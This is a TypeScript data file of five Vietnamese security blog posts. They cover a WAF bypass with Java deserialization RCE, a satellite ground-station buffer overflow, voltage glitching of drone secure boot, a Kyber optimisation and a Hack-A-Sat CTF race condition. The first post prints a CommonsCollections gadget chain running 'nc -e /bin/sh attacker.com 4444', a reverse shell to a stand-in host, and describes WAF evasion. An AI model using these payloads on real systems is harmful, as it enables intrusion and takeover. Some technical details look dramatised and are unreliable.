export interface Post {
  slug: string;
  title: string;
  date: string;
  category: 'AEROSPACE' | 'REVERSE-ENG' | 'CTF-WRITEUP' | 'POST-QUANTUM';
  readTime: string;
  summary: string;
  tags: string[];
  classification: 'TOP-SECRET' | 'RESTRICTED' | 'UNCLASSIFIED';
  content: string;
}

export const POSTS: Post[] = [
  {
    slug: 'waf-bypass-rce-zero-day',
    title: 'Zero-Day Writeup: Bypass WAF & RCE qua Insecure Deserialization trên Hệ Thống Quản Trị',
    date: '2026-10-06',
    category: 'REVERSE-ENG',
    readTime: '22 MIN READ',
    classification: 'RESTRICTED',
    tags: ['BUG-BOUNTY', 'RCE', 'WAF-BYPASS', 'DESERIALIZATION', 'PENTEST'],
    summary: 'Báo cáo chi tiết quá trình phát hiện và khai thác chuỗi lỗ hổng zero-day từ việc bypass Web Application Firewall đến thực thi mã từ xa (RCE) trên hệ thống lõi.',
    content: `
<h2 class="accent" style="margin-top: 1rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 01 // VULNERABILITY OVERVIEW</h2>
<p>Trong quá trình tham gia một chương trình Private Bug Bounty cho một tập đoàn tài chính lớn, đội ngũ <b>LOGKISM</b> đã phát hiện ra một chuỗi lỗ hổng cực kỳ nghiêm trọng. Kẻ tấn công có thể bypass hệ thống WAF (Web Application Firewall) lớp ngoài và khai thác lỗ hổng <b>Insecure Deserialization</b> bên trong ứng dụng Java Spring Boot để đạt được Remote Code Execution (RCE).</p>

<img src="/images/bg_cyber.jpg" alt="WAF Block Graph" style="width: 100%; height: auto; border: 1px solid var(--line-accent); margin: 1.5rem 0; box-shadow: 0 0 20px var(--glow);" />
<em style="color: var(--muted); font-size: 0.85em; display: block; text-align: center; margin-top: -1rem; margin-bottom: 2rem;">Hình 1: Đồ thị lưu lượng mạng bị WAF block (Tái hiện).</em>

<h2 class="accent" style="margin-top: 2rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 02 // RECONNAISSANCE & WAF BYPASS</h2>
<p>Bề mặt tấn công ban đầu là một endpoint API nội bộ bị lộ ra ngoài internet do lỗi cấu hình Nginx proxy:</p>

<pre style="background: rgba(13, 13, 17, 0.9); padding: 1rem; border-left: 2px solid var(--accent); margin: 1rem 0; overflow-x: auto; font-size: 0.9em; line-height: 1.4;"><code>GET /api/v1/internal/admin/sync HTTP/1.1
Host: api.redacted.com
X-Forwarded-For: 127.0.0.1</code></pre>

<p>Hệ thống WAF chặn các payload thông thường như ngoặc kép (<code>"</code>), lệnh shell (<code>/bin/bash</code>), và các chuỗi serialized base64 đặc trưng của Java (<code>rO0AB...</code>). Tuy nhiên, WAF lại bỏ qua việc kiểm tra payload nếu Header <code>Content-Encoding: chunked</code> được sử dụng kèm với những ký tự null byte (<code>%00</code>) nằm trước phần thân HTTP request.</p>

<h2 class="accent" style="margin-top: 2rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 03 // EXPLOITING INSECURE DESERIALIZATION (RCE)</h2>
<p>Sau khi gửi được payload nguyên vẹn đến backend, bước tiếp theo là tạo gadget chain khai thác thư viện CommonsCollections bị lỗi của backend.</p>
<p>Thay vì sử dụng Ysoserial truyền thống, chúng tôi phải custom lại một Gadget chain bằng cách sử dụng class <code>BadAttributeValueExpException</code> kết hợp với <code>TiedMapEntry</code> để trigger hàm <code>getValue()</code>, từ đó thực thi mã thông qua <code>Runtime.exec()</code>.</p>

<pre style="background: rgba(13, 13, 17, 0.9); padding: 1rem; border-left: 2px solid var(--accent); margin: 1rem 0; overflow-x: auto; font-size: 0.9em; line-height: 1.4;"><code class="language-java">// Gadget Chain Triggers
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "nc -e /bin/sh attacker.com 4444" })
};</code></pre>

<h2 class="accent" style="margin-top: 2rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 04 // PROOF OF CONCEPT & IMPACT</h2>
<p>Khi gửi payload đã mã hoá, backend tiến hành deserialize đối tượng và thực thi lệnh netcat, trả về một Reverse Shell với quyền <code>root</code> trên container Docker.</p>

<blockquote style="border-left: 3px solid var(--ok); padding-left: 1rem; margin: 1.5rem 0; color: var(--fg); background: rgba(31, 122, 77, 0.1); padding: 1rem;">
  <b>IMPACT:</b> Kẻ tấn công có toàn quyền kiểm soát microservice của backend, có thể trích xuất biến môi trường chứa Secret Keys của AWS S3 và rò rỉ dữ liệu nhạy cảm của khách hàng. Điểm CVSS tính toán: <b>9.8 (CRITICAL)</b>.
</blockquote>

<h2 class="accent" style="margin-top: 2rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 05 // REMEDIATION</h2>
<p>Chúng tôi đã khuyến nghị đội ngũ bảo mật của tập đoàn áp dụng các bản vá ngay lập tức:</p>
<ul style="margin-left: 1.5rem; margin-top: 1rem; margin-bottom: 2rem; line-height: 1.8;">
  <li>Ngừng sử dụng serialization của Java, thay bằng JSON (Jackson/Gson) với cơ chế kiểm tra kiểu dữ liệu an toàn.</li>
  <li>Cấu hình lại Nginx Ingress Controller để drop triệt để các kết nối trực tiếp vào endpoint <code>/internal/*</code>.</li>
  <li>Cập nhật rule WAF để chống lại các kỹ thuật Evasion như Chunked Encoding Abuse.</li>
</ul>
`
  },
  {
    slug: 'downlink-rf-packet-fuzzing',
    title: 'Downlink Satellite RF Packet Fuzzing: Từ Sóng Radio Đến RCE Trạm Mặt Đất',
    date: '2026-09-18',
    category: 'AEROSPACE',
    readTime: '14 MIN READ',
    classification: 'TOP-SECRET',
    tags: ['SDR', 'GNU-RADIO', 'CCSDS', 'AEROSPACE', 'RCE'],
    summary: 'Phân tích chi tiết quy trình giải mã frame truyền thông vệ tinh tầm thấp (LEO), tái hiện lỗ hổng stack-based buffer overflow trong bộ parser telemetry mặt đất thông qua thiết bị HackRF One.',
    content: `
## 01 // KHÁI QUÁT MỤC TIÊU CHIẾN DỊCH

Trong các giao thức hàng không vũ trụ hiện đại tuân chuẩn CCSDS (Consultative Committee for Space Data Systems), các khối dữ liệu truyền từ vệ tinh về trạm thu mặt đất (Ground Station) thường được đóng gói dưới dạng Space Packet Protocol (SPP). Phần lớn các kỹ sư chú trọng bảo mật tầng mã hoá AES-GCM tại lớp ứng dụng, nhưng lại bỏ quên việc kiểm tra độ dài dữ liệu thô (Frame Header Parsing) tại trạm mặt đất.

\`\`\`c
// Trích đoạn mã nguồn parser bị lỗi tràn bộ đệm
void parse_telemetry_frame(uint8_t *stream, size_t len) {
    char telemetry_buffer[256];
    uint16_t packet_length = (stream[4] << 8) | stream[5];
    
    // [VULNERABILITY]: Thiếu kiểm tra ranh giới packet_length > 256
    memcpy(telemetry_buffer, stream + 6, packet_length);
    dispatch_telemetry(telemetry_buffer);
}
\`\`\`

## 02 // TÁI TẠO BẰNG GNU RADIO & HACKRF

Bằng việc cấu hình chuỗi khối SDR trong GNU Radio Companion, chúng tôi tổng hợp dạng sóng điều chế QPSK tại tần số 437.5 MHz và bơm payload được tính toán chính xác để ghi đè con trỏ lệnh \`$RIP\` trong tiến trình điều khiển trạm mặt đất.

1. Đồng bộ tần số sóng mang và ký hiệu (Costas Loop + Gardner Timing Recovery).
2. Xây dựng frame CCSDS có header hợp lệ nhưng trường chiều dài mang giá trị \`0x0280\`.
3. Bắn tín hiệu RF trực tiếp vào ăng-ten trạm thu. Kết quả: Chiếm quyền shell trạm mặt đất thành công với đặc quyền \`root\`.
    `
  },
  {
    slug: 'uav-cortex-firmware-glitching',
    title: 'Voltage Glitching Trên ARM Cortex-M7: Bẻ Khóa Secure Boot Drone Quân Sự',
    date: '2026-08-24',
    category: 'REVERSE-ENG',
    readTime: '18 MIN READ',
    classification: 'RESTRICTED',
    tags: ['HARDWARE-HACKING', 'VOLTAGE-GLITCH', 'ARM-CORTEX', 'SECURE-BOOT'],
    summary: 'Thực nghiệm bypass chữ ký số ECDSA trong quá trình Secure Boot của vi điều khiển bay UAV bằng kỹ thuật chập nguồn xung nano-giây (Voltage Fault Injection) sử dụng ChipWhisperer.',
    content: `
## 01 // CƠ CHẾ BẢO VỆ CỦA SECURE BOOT

Khi cấp nguồn cho máy bay không người lái (UAV), bootloader ROM kiểm tra chữ ký điện tử ECDSA-P256 của firmware trong bộ nhớ Flash ngoài. Nếu chữ ký không khớp với Root of Trust (RoT) được lưu trong OTP eFuse, CPU sẽ lập tức kích hoạt cờ reset.

\`\`\`armasm
; Vòng lặp kiểm tra chữ ký nhị phân
CMP     R0, #0              ; Kiểm tra kết quả ECDSA_Verify
BNE     boot_failure_trap   ; Nhảy vào bẫy nếu sai chữ ký
BL      jump_to_application ; Nạp firmware chính
\`\`\`

## 02 // THIẾT KẾ XUNG FAULT TẠI ĐIỂM CHẾT

Bằng cách cạo lớp hàn bảo vệ trên PCB và nối trực tiếp dây probe vào chân \`VDD_CORE\`, chúng tôi bắn một xung giảm điện áp cực ngắn (\`18ns\`, \`0.4V\`) đúng chu kỳ xung nhịp lệnh \`BNE\` được thực thi. Lệnh rẽ nhánh bị biến dạng thành \`NOP\`, và vi điều khiển nhảy thẳng vào ứng dụng chứa firmware đã bị can thiệp!
    `
  },
  {
    slug: 'kyber-pqc-microcontroller-speed',
    title: 'Tối Ưu Hoá Mã Hoá Hậu Lượng Tử Kyber-768 Cho Vi Điều Khiển Hạn Chế Tài Nguyên',
    date: '2026-07-12',
    category: 'POST-QUANTUM',
    readTime: '11 MIN READ',
    classification: 'UNCLASSIFIED',
    tags: ['POST-QUANTUM', 'CRYPTO', 'KYBER', 'RUST', 'EMBEDDED'],
    summary: 'Xây dựng bản cài đặt Rust no_std cho thuật toán mã hoá mạng lưới ML-KEM (Kyber-768), tận dụng tập lệnh DSP trên vi điều khiển STM32H7 để giảm độ trễ đóng gói khoá xuống dưới 1.2ms.',
    content: `
## 01 // THÁCH THỨC ĐIỆN TOÁN LƯỢNG TỬ TRÊN VỆ TINH

Các vệ tinh quỹ đạo có vòng đời từ 10-15 năm. Nếu mã hoá dữ liệu downlink bằng RSA hoặc ECC truyền thống, dữ liệu ghi lại ngày hôm nay sẽ dễ dàng bị giải mã trong tương lai bởi máy tính lượng tử ("Harvest Now, Decrypt Later"). Việc đưa thuật toán PQC lên chip nhúng đòi hỏi tối ưu hoá tối đa việc biến đổi NTT (Number Theoretic Transform).

## 02 // TỐI ƯU HOÁ DSP VÀ KẾT QUẢ

Bằng việc cấu trúc lại mảng hệ số đa thức thành SIMD 16-bit và sử dụng tập lệnh song song của ARM Cortex-M7, tốc độ tính toán tăng gấp 3.8 lần so với bản cài đặt chuẩn NIST reference code trong khi lượng RAM sử dụng giảm 45%.
    `
  },
  {
    slug: 'satellite-ctf-space-packet-recon',
    title: 'Write-up Hack-A-Sat CTF: Khai Thác Race Condition Trong Subsystem Phân Bổ Năng Lượng',
    date: '2026-05-30',
    category: 'CTF-WRITEUP',
    readTime: '15 MIN READ',
    classification: 'RESTRICTED',
    tags: ['CTF', 'HACK-A-SAT', 'RACE-CONDITION', 'RTOS', 'FREERTOS'],
    summary: 'Lời giải chi tiết bài thi Hack-A-Sat CTF: khai thác race condition giữa task quản lý tấm pin mặt trời và task nạp pin dự phòng trong hệ điều hành FreeRTOS điều khiển vệ tinh.',
    content: `
## 01 // PHÂN TÍCH PROBLEM STATEMENT

Đề bài cung cấp một file nhị phân firmware chạy trên kiến trúc SPARC (LEON3). Nhiệm vụ là làm cho hệ thống quản lý năng lượng (EPS - Electrical Power Subsystem) rơi vào trạng thái Brown-Out Reset nhằm khởi động lại máy tính trong chế độ Rescue Console, từ đó trích xuất cờ (Flag).

## 02 // EXPLOIT CHAIN

Bằng cách gửi đồng thời 2 lệnh telecommand: một lệnh xoay góc tấm pin mặt trời vào vùng tối Trái Đất và một lệnh kích hoạt máy phát laser công suất cao, một race condition xảy ra trước khi cảm biến dòng điện ngắt nguồn, khiến watchdog trigger và in flag bí mật ra cổng UART.
    `
  }
];
